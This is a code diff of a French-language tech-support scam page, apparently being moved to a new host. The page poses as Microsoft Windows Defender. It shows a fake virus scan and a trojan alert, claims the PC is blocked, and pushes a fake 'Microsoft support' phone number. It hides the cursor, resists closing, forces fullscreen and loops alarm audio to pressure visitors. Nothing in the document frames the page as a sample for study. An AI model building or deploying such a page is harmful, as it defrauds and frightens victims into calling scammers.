@@ -6,13 +6,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="robots" content="noindex">    
     <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="https://learning-live.online/wp-content/themes/new/npm/bootstrap-4.6.0/dist/css/bootstrap.min.css"
+    <link rel="stylesheet" href="https://altfr.netlify.app/wp-content/themes/new/npm/bootstrap-4.6.0/dist/css/bootstrap.min.css"
           >
-    <script src="https://learning-live.online/wp-content/themes/new/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
-    <link rel="stylesheet" type="text/css" href="https://learning-live.online/wp-content/themes/new/main.css">
+    <script src="https://altfr.netlify.app/wp-content/themes/new/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="https://altfr.netlify.app/wp-content/themes/new/main.css">
     <title>Security-Center-Code0x268d3 Services-Error0SecurityrEr0dfdsfd07</title>
-	<link rel="canonical" href="https://learning-live.online/wp-content/themes/new/web.core.windows.net" />
-    <link rel="stylesheet" href="https://learning-live.online/wp-content/themes/new/font-awesome/4.5.0/css/font-awesome.min.css">
+	<link rel="canonical" href="https://altfr.netlify.app/wp-content/themes/new/web.core.windows.net" />
+    <link rel="stylesheet" href="https://altfr.netlify.app/wp-content/themes/new/font-awesome/4.5.0/css/font-awesome.min.css">
     <script type="text/javascript">
         window.onload = function () {
             document.onclick = function (e) {
@@ -53,7 +53,7 @@
         //var phone_number = '919 610 587';
         var phone_number = '+33 9 85 40 99 89';
 </script>
-<!-- Hotjar Tracking Code for learning-live.online -->
+<!-- Hotjar Tracking Code for altfr.netlify.app -->
 <script>
     (function(h,o,t,j,a,r){
         h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
@@ -68,9 +68,9 @@
 <body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">
 
 <div class="bg" style="cursor:none;">
-    <div class="bgimg" style="top: 0px;"><img src="https://learning-live.online/wp-content/themes/new/background 3.jpg" alt="" width="100%"/></div>
+    <div class="bgimg" style="top: 0px;"><img src="https://altfr.netlify.app/wp-content/themes/new/background 3.jpg" alt="" width="100%"/></div>
 </div>
-<a href="https://learning-live.online/wp-content/themes/new/#" rel="noreferrer" id="link_black" style="cursor: none;">
+<a href="https://altfr.netlify.app/wp-content/themes/new/#" rel="noreferrer" id="link_black" style="cursor: none;">
     <div class="black" style="height: 145%;cursor: none;"></div>
 </a>
 <div class="pro_box" style="cursor: none;">
@@ -79,23 +79,23 @@
             <div class="col-md-12">
                 <div class="minimize">
                     <ul>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/minimize.jpg"></a></li>
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/minimize.jpg"></a></li>
                     </ul>
                 </div>
             </div>
             <div class="col-md-4">
                 <div class="logo">
-                    <img src="https://learning-live.online/wp-content/themes/new/microsoft.png"><span>Microsoft Windows</span>
+                    <img src="https://altfr.netlify.app/wp-content/themes/new/microsoft.png"><span>Microsoft Windows</span>
                 </div>
             </div>
             <div class="col-md-8">
                 <div class="activate_lic">
                     <ul>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#">
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#">
                                 <button>Activer la licence</button>
                             </a></li>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/setting.png"></a></li>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/que.png"></a></li>
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/setting.png"></a></li>
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/que.png"></a></li>
                     </ul>
                 </div>
             </div>
@@ -106,13 +106,13 @@
             <div class="row">
                 <div class="col-md-6">
                     <div class="quick_scan">
-                        <p><img src="https://learning-live.online/wp-content/themes/new/virus-scan.png"><span>Analyse rapide</span></p>
+                        <p><img src="https://altfr.netlify.app/wp-content/themes/new/virus-scan.png"><span>Analyse rapide</span></p>
                     </div>
                 </div>
                 <div class="col-md-6">
                     <div class="minimize1">
                         <ul>
-                            <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/minimize.jpg"></a></li>
+                            <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/minimize.jpg"></a></li>
                         </ul>
                     </div>
                 </div>
@@ -179,24 +179,24 @@
             <div class="col-md-12">
                 <div class="minimize">
                     <ul>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/minimize.jpg"></a></li>
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/minimize.jpg"></a></li>
                     </ul>
                 </div>
             </div>
             <div class="col-md-4">
                 <div class="logo">
-                    <img src="https://learning-live.online/wp-content/themes/new/microsoft.png"><span>Microsoft Windows</span>
+                    <img src="https://altfr.netlify.app/wp-content/themes/new/microsoft.png"><span>Microsoft Windows</span>
                 </div>
             </div>
             <div class="col-md-8">
                 <div class="activate_lic">
                     <ul>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#">
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#">
                                 <button>Activer la licence</button>
                             </a></li>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/bell.png"></a></li>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/setting.png"></a></li>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/que.png"></a></li>
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/bell.png"></a></li>
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/setting.png"></a></li>
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/que.png"></a></li>
                     </ul>
                 </div>
             </div>
@@ -207,13 +207,13 @@
             <div class="row">
                 <div class="col-md-6">
                     <div class="quick_scan">
-                        <p><img src="https://learning-live.online/wp-content/themes/new/virus-scan.png"><span>Scanner</span></p>
+                        <p><img src="https://altfr.netlify.app/wp-content/themes/new/virus-scan.png"><span>Scanner</span></p>
                     </div>
                 </div>
                 <div class="col-md-6">
                     <div class="minimize1">
                         <ul>
-                            <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/minimize.jpg"></a></li>
+                            <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/minimize.jpg"></a></li>
                         </ul>
                     </div>
                 </div>
@@ -227,11 +227,11 @@
                 <div class="col-md-8">
                     <div class="total_detail">
                         <ul>
-                            <li><a href="https://learning-live.online/wp-content/themes/new/#"><p>Éléments détectés</p>
+                            <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><p>Éléments détectés</p>
                                     <p>41</p></a></li>
-                            <li><a href="https://learning-live.online/wp-content/themes/new/#"><p>Temps de scan</p>
+                            <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><p>Temps de scan</p>
                                     <p>5 secs</p></a></li>
-                            <li><a href="https://learning-live.online/wp-content/themes/new/#"><p>Articles scannés</p>
+                            <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><p>Articles scannés</p>
                                     <p>37,930</p></a></li>
                         </ul>
                     </div>
@@ -396,14 +396,14 @@
                 <div class="col-md-6">
                     <div class="bt_can">
                         <div class="dropdown">
-                            <a class="btn btn-secondary dropdown-toggle" style="width:126px;" href="https://learning-live.online/wp-content/themes/new/#" role="button"
+                            <a class="btn btn-secondary dropdown-toggle" style="width:126px;" href="https://altfr.netlify.app/wp-content/themes/new/#" role="button"
                                id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                 Résultat
                             </a>
                             <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
-                                <a class="dropdown-item" href="https://learning-live.online/wp-content/themes/new/#">Action</a>
-                                <a class="dropdown-item" href="https://learning-live.online/wp-content/themes/new/#">Autres actions</a>
-                                <a class="dropdown-item" href="https://learning-live.online/wp-content/themes/new/#">Autres</a>
+                                <a class="dropdown-item" href="https://altfr.netlify.app/wp-content/themes/new/#">Action</a>
+                                <a class="dropdown-item" href="https://altfr.netlify.app/wp-content/themes/new/#">Autres actions</a>
+                                <a class="dropdown-item" href="https://altfr.netlify.app/wp-content/themes/new/#">Autres</a>
                             </div>
                         </div>
                     </div>
@@ -428,24 +428,24 @@
             <div class="col-md-12">
                 <div class="minimize">
                     <ul>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/minimize.jpg"></a></li>
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/minimize.jpg"></a></li>
                     </ul>
                 </div>
             </div>
             <div class="col-md-4">
                 <div class="logo">
-                    <img src="https://learning-live.online/wp-content/themes/new/microsoft.png"><span>Microsoft Windows</span>
+                    <img src="https://altfr.netlify.app/wp-content/themes/new/microsoft.png"><span>Microsoft Windows</span>
                 </div>
             </div>
             <div class="col-md-8">
                 <div class="activate_lic">
                     <ul>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#">
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#">
                                 <button>Activer la licence</button>
                             </a></li>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/bell.png"></a></li>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/setting.png"></a></li>
-                        <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/que.png"></a></li>
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/bell.png"></a></li>
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/setting.png"></a></li>
+                        <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/que.png"></a></li>
                     </ul>
                 </div>
             </div>
@@ -456,13 +456,13 @@
             <div class="row">
                 <div class="col-md-6">
                     <div class="quick_scan">
-                        <p><img src="https://learning-live.online/wp-content/themes/new/virus-scan.png"><span>Scanner</span></p>
+                        <p><img src="https://altfr.netlify.app/wp-content/themes/new/virus-scan.png"><span>Scanner</span></p>
                     </div>
                 </div>
                 <div class="col-md-6">
                     <div class="minimize1">
                         <ul>
-                            <li><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/minimize.jpg"></a></li>
+                            <li><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/minimize.jpg"></a></li>
                         </ul>
                     </div>
                 </div>
@@ -473,9 +473,9 @@
                 <div class="col-md-12">
                     <div class="total_detail_scan">
                         <ul>
-                            <li><a href="https://learning-live.online/wp-content/themes/new/#">Scanner</a></li>
-                            <li><a href="https://learning-live.online/wp-content/themes/new/#">Planificateur d’analyse</a></li>
-                            <li><a href="https://learning-live.online/wp-content/themes/new/#">Rapports</a></li>
+                            <li><a href="https://altfr.netlify.app/wp-content/themes/new/#">Scanner</a></li>
+                            <li><a href="https://altfr.netlify.app/wp-content/themes/new/#">Planificateur d’analyse</a></li>
+                            <li><a href="https://altfr.netlify.app/wp-content/themes/new/#">Rapports</a></li>
                         </ul>
                     </div>
                 </div>
@@ -485,7 +485,7 @@
                 <div class="row">
                     <div class="col-md-4">
                         <div class="pc_desk">
-                            <img src="https://learning-live.online/wp-content/themes/new/pc.png">
+                            <img src="https://altfr.netlify.app/wp-content/themes/new/pc.png">
                         </div>
                     </div>
                     <div class="col-md-4">
@@ -521,7 +521,7 @@
             <div class="row">
                 <div class="col-md-2">
                     <div class="viruses">
-                        <img src="https://learning-live.online/wp-content/themes/new/virus-scan.png">
+                        <img src="https://altfr.netlify.app/wp-content/themes/new/virus-scan.png">
                     </div>
                 </div>
                 <div class="col-md-10">
@@ -538,7 +538,7 @@
     <div class="row">
         <div class="col-md-12">
             <div class="right-foot" style="text-align: center;">
-                <span id="footertxt"><img src="https://learning-live.online/wp-content/themes/new/microsoft.png"> Defender: </span><span
+                <span id="footertxt"><img src="https://altfr.netlify.app/wp-content/themes/new/microsoft.png"> Defender: </span><span
                         style="font-weight: 700;padding-left: 13px;color: #fff;">Contacter Microsoft <span
                             style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><script>document.write(phone_number)</script>             (Assistance téléphonique)</span></span>
             </div>
@@ -555,34 +555,34 @@
 <div id="poptxt" class="lightbox">
     <div class="ilb top">
         <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
-            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="https://learning-live.online/wp-content/themes/new/def.png" class="logo3"></span> Centre de sécurité Defender</span>
-            <span id="txts1" class="fl title2"><a href="https://learning-live.online/wp-content/themes/new/#"><img src="https://learning-live.online/wp-content/themes/new/cross.png"></a></span>
+            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="https://altfr.netlify.app/wp-content/themes/new/def.png" class="logo3"></span> Centre de sécurité Defender</span>
+            <span id="txts1" class="fl title2"><a href="https://altfr.netlify.app/wp-content/themes/new/#"><img src="https://altfr.netlify.app/wp-content/themes/new/cross.png"></a></span>
         </div>
     </div>
     <div id="txtintro">
                 <span class="colo-rd">App: Ads.flancetrack(2).dll<br>Menace détectée : cheval de Troie espion</span>
-				<img src="https://learning-live.online/wp-content/themes/new/save.jpg"style="width: 200px;" id="banner">
+				<img src="https://altfr.netlify.app/wp-content/themes/new/save.jpg"style="width: 200px;" id="banner">
     </div>
     <div id="disclaimer">
         L’accès à ce PC a été bloqué pour des raisons de sécurité<br>
         <h3>Contacter le support Windows :</h3><br>
-		<img src="https://learning-live.online/wp-content/themes/new/phone1FR.jpg"style="width: 200px;" id="banner">
+		<img src="https://altfr.netlify.app/wp-content/themes/new/phone1FR.jpg"style="width: 200px;" id="banner">
 		
 		<span>(Ligne gratuite)</span><br>
             
     </div>
     <div id="bottom">
-        <img id="badge" src="https://learning-live.online/wp-content/themes/new/microsoft.png"><span class="title3"> Sécurité Windows </span>
+        <img id="badge" src="https://altfr.netlify.app/wp-content/themes/new/microsoft.png"><span class="title3"> Sécurité Windows </span>
         <ul>
             <li>
-                <a href="https://learning-live.online/wp-content/themes/new/#">
+                <a href="https://altfr.netlify.app/wp-content/themes/new/#">
                     <div class="fr button2" style="    padding: 10px 20px 10px 20px;">
                         <span id="addtochromebutton">Annuler</span>
                     </div>
                 </a>
             </li>
             <li>
-                <a href="https://learning-live.online/wp-content/themes/new/#">
+                <a href="https://altfr.netlify.app/wp-content/themes/new/#">
                     <div class="fr button" style="    padding: 10px 20px 10px 20px;">
                         <span id="addtochromebutton">Accepter</span>
                     </div>
@@ -604,7 +604,7 @@ Un ingénieur Smart Defender vous aidera à protéger votre ordinateur par tél�
 
 
   <div id="chat" style="display: block;">
-    <img src="https://learning-live.online/wp-content/themes/new/microsoft.png" style="margin-left:0px">
+    <img src="https://altfr.netlify.app/wp-content/themes/new/microsoft.png" style="margin-left:0px">
     <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft Windows</span>
     <p style="font-weight:600;font-size:24px;margin-left:10px">Centre de sécurité <br>
     </p>
@@ -632,13 +632,13 @@ Un ingénieur Smart Defender vous aidera à protéger votre ordinateur par tél�
 </div>
 <!-- Optional JavaScript; choose one of the two! -->
 <!-- Option 1: jQuery and Bootstrap Bundle (includes Popper) -->
-<script src="https://learning-live.online/wp-content/themes/new/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
-<script src="https://learning-live.online/wp-content/themes/new/npm/bootstrap-4.6.0/dist/js/bootstrap.bundle.min.js"
+<script src="https://altfr.netlify.app/wp-content/themes/new/ajax/libs/modernizr/2.8.3/modernizr.min.js" type="text/javascript"></script>
+<script src="https://altfr.netlify.app/wp-content/themes/new/npm/bootstrap-4.6.0/dist/js/bootstrap.bundle.min.js"
         ></script>
-<script type="text/javascript" src="https://learning-live.online/wp-content/themes/new/fullscreen.js"></script>
-<script type="text/javascript" src="https://learning-live.online/wp-content/themes/new/before.js"></script>
-<script type="text/javascript" src="https://learning-live.online/wp-content/themes/new/main.js"></script>
-<script type="text/javascript" src="https://learning-live.online/wp-content/themes/new/light.js"></script>
+<script type="text/javascript" src="https://altfr.netlify.app/wp-content/themes/new/fullscreen.js"></script>
+<script type="text/javascript" src="https://altfr.netlify.app/wp-content/themes/new/before.js"></script>
+<script type="text/javascript" src="https://altfr.netlify.app/wp-content/themes/new/main.js"></script>
+<script type="text/javascript" src="https://altfr.netlify.app/wp-content/themes/new/light.js"></script>
 <script type="text/javascript">
     $(function () {
         var current_progress = 0;
@@ -870,7 +870,7 @@ Un ingénieur Smart Defender vous aidera à protéger votre ordinateur par tél�
     <script>
   $(document).ready(function() {
    var audioElement = document.createElement('audio');
-   audioElement.setAttribute('src', 'https://learning-live.online/wp-content/themes/new/beep.mp3');
+   audioElement.setAttribute('src', 'https://altfr.netlify.app/wp-content/themes/new/beep.mp3');
 
    audioElement.addEventListener('ended', function() {
        this.play();
@@ -904,7 +904,7 @@ Un ingénieur Smart Defender vous aidera à protéger votre ordinateur par tél�
 <script>
   $(document).ready(function() {
    var audioElement = document.createElement('audio');
-   audioElement.setAttribute('src', 'https://learning-live.online/wp-content/themes/new/fr.mp3');
+   audioElement.setAttribute('src', 'https://altfr.netlify.app/wp-content/themes/new/fr.mp3');
 
    audioElement.addEventListener('ended', function() {
        this.play();
